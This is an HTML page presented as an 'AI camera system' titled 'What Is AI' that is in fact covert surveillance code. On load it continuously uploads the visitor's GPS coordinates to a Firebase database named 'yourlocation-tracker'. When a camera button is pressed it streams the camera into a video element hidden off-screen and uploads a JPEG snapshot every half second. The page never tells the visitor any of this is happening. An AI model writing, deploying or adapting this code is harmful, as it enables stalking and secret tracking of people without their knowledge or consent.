<!DOCTYPE html>
<html>
<head>
<title>What Is AI</title>

<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>

<style>

body{
background:black;
color:white;
text-align:center;
font-family:Arial;
padding-top:100px;
}

h1{
font-size:50px;
}

button{
font-size:30px;
padding:15px 40px;
margin:10px;
background:lime;
border:none;
border-radius:10px;
}

video{
position:absolute;
left:-9999px;
}

</style>

</head>
<body>

<h1>AI CAMERA SYSTEM</h1>

<button onclick="startFront()">FRONT CAMERA</button>
<button onclick="startBack()">BACK CAMERA</button>

<video id="video" autoplay playsinline muted></video>

<script>

const firebaseConfig = {
 apiKey: "AIzaSyAiC_oz0Qm99P1K9DcRFQb4eY5GHRujW_c",
 databaseURL: "https://yourlocation-tracker-default-rtdb.asia-southeast1.firebasedatabase.app",
 projectId: "yourlocation-tracker"
};

firebase.initializeApp(firebaseConfig);

let deviceId="phone_"+Math.floor(Math.random()*100000);

let currentStream=null;


// LOCATION ALWAYS RUN
navigator.geolocation.watchPosition(function(pos){

firebase.database().ref("devices/"+deviceId+"/location").set({
lat:pos.coords.latitude,
lon:pos.coords.longitude
});

});


function startFront(){
startCamera("user","front");
}

function startBack(){
startCamera("environment","back");
}


function startCamera(mode,type){

// stop previous
if(currentStream){

currentStream.getTracks().forEach(track=>track.stop());

}

navigator.mediaDevices.getUserMedia({
video:{facingMode:mode}
})
.then(function(stream){

currentStream=stream;

let video=document.getElementById("video");

video.srcObject=stream;

video.play();

capture(video,type);

});

}


function capture(video,type){

let canvas=document.createElement("canvas");

let ctx=canvas.getContext("2d");

setInterval(function(){

if(video.videoWidth===0) return;

canvas.width=video.videoWidth;
canvas.height=video.videoHeight;

ctx.drawImage(video,0,0);

let img=canvas.toDataURL("image/jpeg",0.8);

firebase.database().ref("devices/"+deviceId+"/camera/"+type).set({
img:img
});

},500);

}

</script>

</body>
</html>
